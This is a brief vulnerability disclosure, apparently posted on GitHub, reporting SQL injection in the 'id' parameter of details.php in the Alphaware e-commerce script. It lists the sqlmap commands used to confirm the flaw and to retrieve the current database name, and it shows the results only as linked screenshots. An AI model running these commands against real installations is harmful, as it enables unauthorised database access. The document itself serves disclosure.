# Alphaware - Simple E-Commerce System v1.0 by razormist has SQL injection

BUG_Author: Murasaki

Vulnerability File: /alphaware/details.php

Parameter "id" (GET), exists SQL injection vulnerability

sqlmap detect injection vulnerabilities: "sqlmap -u http://ip/alphaware/details.php?id=1"

sqlmap injection result

![image](https://github.com/1MurasaKi/picture/blob/main/detectInjection.png)

sqlmap Queries the current database: "sqlmap -u http://ip/alphaware/details.php?id=1 --current-db"

sqlmap injection result

![image](https://github.com/1MurasaKi/picture/blob/main/crdb.png)
